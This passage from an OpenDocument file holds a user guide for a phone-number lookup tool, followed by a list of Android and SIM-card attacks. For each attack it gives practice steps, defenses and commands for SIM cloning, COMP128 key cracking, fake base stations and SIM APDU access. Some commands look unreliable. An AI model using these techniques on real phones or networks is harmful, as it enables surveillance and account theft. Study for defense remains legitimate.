      <text:p text:style-name="Preformatted_20_Text">📱 Number<text:tab/>The formatted phone number</text:p>
      <text:p text:style-name="Preformatted_20_Text">🌍 Country<text:tab/>Country determined from country code</text:p>
      <text:p text:style-name="Preformatted_20_Text">📍 Location<text:tab/>Geographic region (may be same as country for mobile numbers)</text:p>
      <text:p text:style-name="Preformatted_20_Text">📡 Carrier<text:tab/>Original network operator (may be outdated due to number portability)</text:p>
      <text:p text:style-name="Preformatted_20_Text">⏰ Timezone<text:tab/>IANA timezone of the region</text:p>
      <text:p text:style-name="Preformatted_20_Text">🕐 Local Time<text:tab/>Current local time at that location</text:p>
      <text:p text:style-name="Preformatted_20_Text">🗺️ Coordinates<text:tab/>Approximate city-level latitude/longitude</text:p>
      <text:p text:style-name="Preformatted_20_Text">📊 Number Type<text:tab/>Mobile, Fixed Line, Toll Free, etc.</text:p>
      <text:p text:style-name="Preformatted_20_Text">📈 Metadata<text:tab/>Performance metrics and rate limit info</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">3. Command-Line Options</text:p>
      <text:p text:style-name="Preformatted_20_Text">Option<text:tab/>Description</text:p>
      <text:p text:style-name="Preformatted_20_Text">--offline<text:tab/>Use only offline databases (no internet geocoding)</text:p>
      <text:p text:style-name="Preformatted_20_Text">--api-key KEY<text:tab/>Authenticate with an API key (if configured)</text:p>
      <text:p text:style-name="Preformatted_20_Text">--client-id ID<text:tab/>Identify client for rate limiting (default: cli_user)</text:p>
      <text:p text:style-name="Preformatted_20_Text">--batch FILE.json<text:tab/>Process multiple numbers from a JSON file</text:p>
      <text:p text:style-name="Preformatted_20_Text">--stats<text:tab/>Display tracker statistics</text:p>
      <text:p text:style-name="Preformatted_20_Text">--verbose<text:tab/>Enable verbose logging</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Example: Offline Mode</text:p>
      <text:p text:style-name="Preformatted_20_Text">python complete_example.py +255222345678 --offline</text:p>
      <text:p text:style-name="Preformatted_20_Text">Useful when internet is unavailable or to avoid API rate limits.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">4. Batch Processing</text:p>
      <text:p text:style-name="Preformatted_20_Text">Create a JSON file (e.g., numbers.json) containing an array of phone numbers:</text:p>
      <text:p text:style-name="Preformatted_20_Text">[</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"+255712345678",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"+255752345678",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"+255222345678",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"+255242345678"</text:p>
      <text:p text:style-name="Preformatted_20_Text">]</text:p>
      <text:p text:style-name="Preformatted_20_Text">Then run batch mode:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/>python complete_example.py --batch numbers.json</text:p>
      <text:p text:style-name="Preformatted_20_Text">Output:</text:p>
      <text:p text:style-name="Preformatted_20_Text">📋 Processing 4 numbers...</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">✅ Batch Complete</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="3"/>Successful: 4</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="3"/>Failed: 0</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="3"/>Batch ID: a1b2c3d4</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="3"/>Results saved to: batch_results_a1b2c3d4.json</text:p>
      <text:p text:style-name="Preformatted_20_Text">The results file contains detailed data for each number, including success/failure status and metadata.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">5. Using the GUI</text:p>
      <text:p text:style-name="Preformatted_20_Text">If you prefer a graphical interface, you can launch the Tkinter GUI:</text:p>
      <text:p text:style-name="Preformatted_20_Text">python src/main.py</text:p>
      <text:p text:style-name="Preformatted_20_Text">This opens a dark-themed window where you can:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Enter a phone number in international format</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Click "TRACK" to get results</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• View detailed information with color coding</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Copy results to clipboard</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Open location in Google Maps</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Save lookups to history</text:p>
      <text:p text:style-name="Preformatted_20_Text">![GUI Screenshot Placeholder]</text:p>
      <text:p text:style-name="Preformatted_20_Text">Note: The GUI requires tkinter (usually included with Python).</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">6. Testing with Different Number Types</text:p>
      <text:p text:style-name="Preformatted_20_Text">Tanzanian Mobile Numbers by Operator</text:p>
      <text:p text:style-name="Preformatted_20_Text">Operator<text:tab/>Prefixes<text:tab/>Example</text:p>
      <text:p text:style-name="Preformatted_20_Text">Vodacom<text:tab/>74, 75, 76<text:tab/>+255742345678</text:p>
      <text:p text:style-name="Preformatted_20_Text">Airtel<text:tab/>68, 69, 78<text:tab/>+255782345678</text:p>
      <text:p text:style-name="Preformatted_20_Text">tiGO<text:tab/>65, 67, 71, 77<text:tab/>+255712345678</text:p>
      <text:p text:style-name="Preformatted_20_Text">halotel<text:tab/>61, 62<text:tab/>+255622345678</text:p>
      <text:p text:style-name="Preformatted_20_Text">TTCL (fixed)<text:tab/>22, 24, 26, etc.<text:tab/>+255222345678</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Fixed-Line Numbers (with area codes)</text:p>
      <text:p text:style-name="Preformatted_20_Text"># Dar es Salaam (area code 22)</text:p>
      <text:p text:style-name="Preformatted_20_Text">python complete_example.py +255221234567</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># Arusha (area code 27)</text:p>
      <text:p text:style-name="Preformatted_20_Text">python complete_example.py +255271234567</text:p>
      <text:p text:style-name="Preformatted_20_Text">Invalid Number Test</text:p>
      <text:p text:style-name="Preformatted_20_Text">python complete_example.py +25599999999</text:p>
      <text:p text:style-name="Preformatted_20_Text">Output will show ❌ TRACKING FAILED with an appropriate error message.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">7. Viewing Statistics</text:p>
      <text:p text:style-name="Preformatted_20_Text">To see how many lookups have been performed and cache status:</text:p>
      <text:p text:style-name="Preformatted_20_Text">python complete_example.py --stats</text:p>
      <text:p text:style-name="Preformatted_20_Text">Example Output:</text:p>
      <text:p text:style-name="Preformatted_20_Text">📊 Tracker Statistics</text:p>
      <text:p text:style-name="Preformatted_20_Text">========================================</text:p>
      <text:p text:style-name="Preformatted_20_Text">Cache Size: 15</text:p>
      <text:p text:style-name="Preformatted_20_Text">Offline Mode: False</text:p>
      <text:p text:style-name="Preformatted_20_Text">Total Requests Today: 23</text:p>
      <text:p text:style-name="Preformatted_20_Text">Unique Clients: 2</text:p>
      <text:p text:style-name="Preformatted_20_Text">Supported Countries: 52</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">8. Advanced: Using the Python API Directly</text:p>
      <text:p text:style-name="Preformatted_20_Text">You can also use the tracker programmatically in your own scripts:</text:p>
      <text:p text:style-name="Preformatted_20_Text">from complete_example import SecurePhoneTracker</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/></text:p>
      <text:p text:style-name="Preformatted_20_Text"># Initialize tracker</text:p>
      <text:p text:style-name="Preformatted_20_Text">tracker = SecurePhoneTracker(offline_mode=False)</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># Track a number</text:p>
      <text:p text:style-name="Preformatted_20_Text">result = tracker.track_phone("+255712345678", client_id="my_script")</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">if result['success']:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>data = result['data']</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>print(f"Carrier: {data['carrier_name']}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>print(f"Location: {data['location']}")</text:p>
      <text:p text:style-name="Preformatted_20_Text">else:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>print(f"Error: {result['error']}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">9. Troubleshooting Common Issues</text:p>
      <text:p text:style-name="Preformatted_20_Text">Issue 1: "ModuleNotFoundError: No module named 'phonenumbers'"</text:p>
      <text:p text:style-name="Preformatted_20_Text">Solution: Ensure dependencies are installed:</text:p>
      <text:p text:style-name="Preformatted_20_Text">pip install -r requirements.txt</text:p>
      <text:p text:style-name="Preformatted_20_Text">Issue 2: Geocoding fails or times out</text:p>
      <text:p text:style-name="Preformatted_20_Text">Cause: Nominatim API rate limiting. Fix: Use --offline mode or add a longer delay between requests.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Issue 3: Numbers from certain countries show incorrect location</text:p>
      <text:p text:style-name="Preformatted_20_Text">Explanation: The library relies on prefix databases. For mobile numbers, it can only determine the country, not the city. This is by design.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Issue 4: GUI won't open</text:p>
      <text:p text:style-name="Preformatted_20_Text">Cause: tkinter not installed. Fix: Install Tkinter:</text:p>
      <text:p text:style-name="Preformatted_20_Text"># On Debian/Ubuntu</text:p>
      <text:p text:style-name="Preformatted_20_Text">sudo apt-get install python3-tk</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># On Windows, reinstall Python with Tcl/Tk support</text:p>
      <text:p text:style-name="Preformatted_20_Text">Issue 5: Rate limit exceeded</text:p>
      <text:p text:style-name="Preformatted_20_Text">Solution: Wait an hour or modify the rate limit in SecurePhoneTracker.__init__:</text:p>
      <text:p text:style-name="Preformatted_20_Text">self.rate_limit = 200 <text:s/># Increase from 100</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">10. Ethical and Legal Reminder</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Only track numbers you own or have explicit permission to investigate.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Respect privacy laws such as Tanzania's Personal Data Protection Act, 2022.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• This tool is for legitimate purposes like fraud prevention, emergency services, and personal security research.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Misuse for stalking or harassment is illegal and unethical.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Quick Reference Card</text:p>
      <text:p text:style-name="Preformatted_20_Text">Task<text:tab/>Command</text:p>
      <text:p text:style-name="Preformatted_20_Text">Track one number<text:tab/>python complete_example.py +255712345678</text:p>
      <text:p text:style-name="Preformatted_20_Text">Use offline mode<text:tab/>python complete_example.py +255712345678 --offline</text:p>
      <text:p text:style-name="Preformatted_20_Text">Batch process<text:tab/>python complete_example.py --batch numbers.json</text:p>
      <text:p text:style-name="Preformatted_20_Text">Launch GUI<text:tab/>python src/main.py</text:p>
      <text:p text:style-name="Preformatted_20_Text">Show stats<text:tab/>python complete_example.py --stats</text:p>
      <text:p text:style-name="Preformatted_20_Text">Verbose logging<text:tab/>python complete_example.py +255712345678 --verbose</text:p>
      <text:p text:style-name="Preformatted_20_Text">Help<text:tab/>python complete_example.py -h</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Now you're ready to use J Phone NoTracker for your phone number intelligence needs. Start with simple lookups, explore the batch mode for bulk processing, and always use responsibly!</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Android &amp; SIM Card Vulnerabilities: 20+ Critical Examples for Security Experts</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/>As a senior security engineer, I've curated this comprehensive list of Android and SIM card vulnerabilities that represent the most significant threats in mobile security today. Each example includes detailed practice methodology and defensive strategies you can implement in your security assessments.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">SIM Card &amp; Baseband Vulnerabilities</text:p>
      <text:p text:style-name="Preformatted_20_Text">1. SIM Card Applet Vulnerabilities (Java Card Exploitation)</text:p>
      <text:p text:style-name="Preformatted_20_Text">Affected Component: SIM card applets (Java Card)</text:p>
      <text:p text:style-name="Preformatted_20_Text">Detailed Information: Modern SIM cards are essentially small computers running Java Card applets. These applets handle sensitive operations including cryptographic authentication with the mobile network. Researchers have discovered that vulnerabilities in these applets can allow attackers to execute arbitrary code on the SIM card itself, potentially compromising the device's network authentication credentials. The attack vector often involves malicious SMS messages containing specially crafted APDU (Application Protocol Data Unit) commands that exploit memory corruption in the Java Card Virtual Machine.</text:p>
      <text:p text:style-name="Preformatted_20_Text">How to Practice:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Acquire a programmable Java Card (like the J3A040 or J3H080) and a smart card reader (e.g., ACR122U or SCL010)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Install the Java Card Development Kit and GlobalPlatformPro tools</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Decompile existing SIM applets using tools like JCAnalyzer</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Use fuzzing frameworks like JCAlgTest to send malformed APDUs</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>5. Monitor for unexpected behavior using a logic analyzer between the card reader and card</text:p>
      <text:p text:style-name="Preformatted_20_Text"># Install GlobalPlatformPro</text:p>
      <text:p text:style-name="Preformatted_20_Text">sudo apt install -y gp</text:p>
      <text:p text:style-name="Preformatted_20_Text"># Send APDU command to card</text:p>
      <text:p text:style-name="Preformatted_20_Text">gp --apdu 00A4040008A000000003000000</text:p>
      <text:p text:style-name="Preformatted_20_Text"># Monitor card responses</text:p>
      <text:p text:style-name="Preformatted_20_Text">gp --info</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Implement proper input validation in all Java Card applet code</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use secure coding practices including bounds checking on all arrays</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Enable Java Card firewall features to isolate applets</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Regularly audit SIM applet code through formal verification methods</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Apply carrier-issued security patches promptly</text:p>
      <text:p text:style-name="Preformatted_20_Text">2. SIM Cloning via COMP128 Vulnerabilities</text:p>
      <text:p text:style-name="Preformatted_20_Text">Affected Component: SIM card authentication algorithm (COMP128)</text:p>
      <text:p text:style-name="Preformatted_20_Text">Detailed Information: The COMP128 algorithm used in GSM authentication has known cryptographic weaknesses. The COMP128-1 variant, still supported in many legacy systems, has a critical vulnerability that allows an attacker within range of a target device to recover the Ki (authentication key) by capturing several authentication challenges and responses. With physical access to the SIM card, researchers have demonstrated key extraction in under 8 hours using side-channel analysis.</text:p>
      <text:p text:style-name="Preformatted_20_Text">How to Practice:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Obtain an old GSM SIM card (pre-2010) and a SIM card reader/writer</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Use open-source tools like simclone or sim-tools</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Capture authentication challenges using a software-defined radio (HackRF or USRP)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Launch cryptographic attacks using specialized software</text:p>
      <text:p text:style-name="Preformatted_20_Text"># Clone a SIM using sim-tools</text:p>
      <text:p text:style-name="Preformatted_20_Text">git clone https://github.com/osmocom/sim-tools.git</text:p>
      <text:p text:style-name="Preformatted_20_Text">cd sim-tools</text:p>
      <text:p text:style-name="Preformatted_20_Text">./sim_read.py /dev/ttyUSB0</text:p>
      <text:p text:style-name="Preformatted_20_Text"># Extract Ki using known vulnerabilities</text:p>
      <text:p text:style-name="Preformatted_20_Text">./crack_comp128 captured_data.bin</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Upgrade to COMP128-3 or AES-based authentication</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="4"/>• Use SIM cards manufactured after 2012 which generally use stronger algorithms</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Enable 3G/4G authentication which uses stronger algorithms</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Replace legacy SIM cards with newer UICC cards supporting modern crypto</text:p>
      <text:p text:style-name="Preformatted_20_Text">3. IMSI Catchers (Stingrays) and False Base Stations</text:p>
      <text:p text:style-name="Preformatted_20_Text">Affected Component: Mobile network authentication</text:p>
      <text:p text:style-name="Preformatted_20_Text">Detailed Information: IMSI catchers exploit the lack of mutual authentication in 2G networks. These devices impersonate legitimate cell towers, forcing nearby phones to connect and reveal their International Mobile Subscriber Identity (IMSI). Advanced versions can intercept calls and SMS messages by downgrading connections to 2G where encryption is weak or non-existent. The technology is widely available commercially and has been documented in numerous law enforcement and espionage cases.</text:p>
      <text:p text:style-name="Preformatted_20_Text">How to Practice:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Set up a software-defined radio environment using BladeRF or USRP</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Install YateBTS or OpenBTS for creating a fake base station</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Use Wireshark with GSM decoding to analyze captured traffic</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Deploy a testing environment in a Faraday cage to avoid interfering with legitimate networks</text:p>
      <text:p text:style-name="Preformatted_20_Text"># Install YateBTS</text:p>
      <text:p text:style-name="Preformatted_20_Text">git clone https://github.com/yatebts/yatebts.git</text:p>
      <text:p text:style-name="Preformatted_20_Text">cd yatebts</text:p>
      <text:p text:style-name="Preformatted_20_Text">./configure &amp;&amp; make &amp;&amp; sudo make install</text:p>
      <text:p text:style-name="Preformatted_20_Text"># Configure fake BTS</text:p>
      <text:p text:style-name="Preformatted_20_Text">sudo nano /etc/yate/subscribers.conf</text:p>
      <text:p text:style-name="Preformatted_20_Text"># Start the fake base station</text:p>
      <text:p text:style-name="Preformatted_20_Text">sudo yate -s</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Disable 2G on your device if not needed (Android: Settings → Network &amp; Internet → Mobile network → Preferred network type → LTE only)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use apps like SnoopSnitch or IMSI-Catcher Catcher that detect suspicious base station behavior</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Enable "LTE only" mode to prevent downgrade attacks</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use encrypted messaging apps (Signal, WhatsApp) rather than SMS for sensitive communication</text:p>
      <text:p text:style-name="Preformatted_20_Text">4. SIM Swap Attacks via Social Engineering</text:p>
      <text:p text:style-name="Preformatted_20_Text">Affected Component: Carrier account management</text:p>
      <text:p text:style-name="Preformatted_20_Text">Detailed Information: SIM swapping represents one of the most financially devastating mobile attacks. Attackers gather personal information about targets through OSINT, then contact mobile carriers pretending to be the victim. They convince support representatives to activate a new SIM card under the attacker's control. Once successful, all calls and SMS, including two-factor authentication codes, route to the attacker's device. This has led to cryptocurrency thefts and account takeovers worth millions.</text:p>
      <text:p text:style-name="Preformatted_20_Text">How to Practice:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Set up a controlled test with a spare phone number and carrier account</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Practice OSINT gathering on yourself (use your own information)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Document the carrier's account recovery process</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Test carrier security by attempting to simulate the attack on your own account (with carrier's permission)</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Set up a PIN or password on your carrier account</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Enable "port-out protection" or "number lock" features</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use authenticator apps (Google Authenticator, Authy) instead of SMS for 2FA</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Consider using a VoIP number for less critical accounts</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Regularly audit your carrier account for suspicious activity</text:p>
      <text:p text:style-name="Preformatted_20_Text">5. Samsung Carrier Relock Bypass (CVE-2026-20974)</text:p>
      <text:p text:style-name="Preformatted_20_Text">Affected Component: Samsung devices with network restrictions</text:p>
      <text:p text:style-name="Preformatted_20_Text">Detailed Information: This vulnerability allows physical attackers to bypass carrier relock mechanisms on Samsung devices . With a CVSS score of 5.2 (Medium), <text:soft-page-break/>it enables attackers to unlock devices to use with unauthorized carriers. The flaw exists in improper input validation in data related to network restrictions prior to SMR Jan-2026 Release 1. Physical access to the device is required, making it particularly relevant for device resellers and forensic examiners.</text:p>
      <text:p text:style-name="Preformatted_20_Text">How to Practice:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Obtain a carrier-locked Samsung device with vulnerable firmware</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Research specific exploitation methods (limited public information)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Practice in controlled environment with proper authorization</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Document device behavior before and after attempted exploitation</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Apply Samsung security updates (SMR Jan-2026 or later)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use strong device encryption and screen locks</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Enable remote wipe capabilities via Find My Mobile</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Consider using device management solutions for corporate devices</text:p>
      <text:p text:style-name="Preformatted_20_Text">6. Qualcomm Baseband QMI Vulnerability (CVE-2020-11292)</text:p>
      <text:p text:style-name="Preformatted_20_Text">Affected Component: Qualcomm MSM Interface (QMI) in baseband chips</text:p>
      <text:p text:style-name="Preformatted_20_Text">Detailed Information: This critical vulnerability affects the Qualcomm baseband chip present in approximately 40% of smartphones globally, including devices from Samsung, LG, Google, OnePlus, and Xiaomi . The flaw exists in the QMI (Qualcomm MSM Interface) protocol used for communication between the application processor and baseband. Attackers can exploit this through malicious apps installed on the device (even without special permissions) to inject code into the QuRT (Qualcomm Real-Time Operating System). Successful exploitation allows attackers to access SMS and call history, intercept voice calls, and potentially crack SIM security. The vulnerability affects even high-end chips like Snapdragon 888 and 870.</text:p>
      <text:p text:style-name="Preformatted_20_Text">How to Practice:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Set up a testing environment with a vulnerable Qualcomm device</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Install Android debugging tools and custom recovery</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Use fuzzing frameworks to test QMI interfaces</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Monitor baseband behavior using specialized debugging hardware</text:p>
      <text:p text:style-name="Preformatted_20_Text"># Access modem diagnostics (requires root)</text:p>
      <text:p text:style-name="Preformatted_20_Text">adb shell</text:p>
      <text:p text:style-name="Preformatted_20_Text">su</text:p>
      <text:p text:style-name="Preformatted_20_Text">echo "AT+QMI" &gt; /dev/smd0</text:p>
      <text:p text:style-name="Preformatted_20_Text">cat /dev/smd0</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Apply security patches (available since December 2020)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Install apps only from trusted sources (Google Play Store)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use mobile security solutions that detect anomalous behavior</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Consider devices with extended security update commitments</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Enable Google Play Protect</text:p>
      <text:p text:style-name="Preformatted_20_Text">7. Baseband Firmware Modification (Shadow SIM Attack)</text:p>
      <text:p text:style-name="Preformatted_20_Text">Affected Component: Baseband processor firmware</text:p>
      <text:p text:style-name="Preformatted_20_Text">Detailed Information: Research presented at BruCON demonstrated techniques for modifying baseband firmware to create "Shadow SIMs" - virtual SIM cards that operate alongside legitimate SIMs without user knowledge . This attack allows attackers to forward authentication vectors and effectively use the device's cellular connectivity for their purposes. The attack leverages the fact that the baseband processor runs separate firmware with its own memory space, often isolated from the main Android OS security controls. Attackers can access the SIM card from the application processor using AT commands, particularly the AT+CSIM command which sends APDUs directly to the SIM.</text:p>
      <text:p text:style-name="Preformatted_20_Text">How to Practice:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Extract baseband firmware from device using tools like QPST or proprietary tools</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Analyze firmware using binwalk, IDA Pro, or Ghidra</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Identify communication channels between AP and baseband</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Practice modifying firmware in isolated environment</text:p>
      <text:p text:style-name="Preformatted_20_Text"># Extract baseband firmware</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/>sudo modprobe qcserial</text:p>
      <text:p text:style-name="Preformatted_20_Text">sudo minicom -D /dev/ttyUSB0</text:p>
      <text:p text:style-name="Preformatted_20_Text"># Send AT commands</text:p>
      <text:p text:style-name="Preformatted_20_Text">AT+CSIM=10,"00A4040008A000000003000000"</text:p>
      <text:p text:style-name="Preformatted_20_Text">Defense:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Keep baseband firmware updated through OEM updates</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Implement hardware-level isolation between AP and baseband</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Use devices with verified boot and secure boot chains</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Monitor for unusual baseband communication patterns</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Consider using devices with open-source baseband implementations (limited options)</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Android OS Vulnerabilities</text:p>
      <text:p text:style-name="Preformatted_20_Text">8. MMS Provider Path Traversal (CVE-2025-48609)</text:p>
      <text:p text:style-name="Preformatted_20_Text">Affected Component: Android's MmsProvider.java</text:p>
      <text:p text:style-name="Preformatted_20_Text">Detailed Information: This vulnerability allows arbitrary file deletion affecting telephony, SMS, and MMS functionalities through a path traversal error . The flaw exists in multiple functions of MmsProvider.java, where insufficient validation of file paths enables attackers to traverse directories and delete files they shouldn't have access to. Critically, this can be exploited without any additional execution privileges, and user interaction is not required. This could lead to denial of service or disruption of critical system functions.</text:p>
      <text:p text:style-name="Preformatted_20_Text">How to Practice:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Set up Android emulator with vulnerable version (specific versions not yet published)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Create a test app that interacts with Content Providers</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Craft malicious URIs with path traversal sequences</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Monitor file system changes and app behavior</text:p>
      <text:p text:style-name="Preformatted_20_Text">// Example test code for path traversal</text:p>
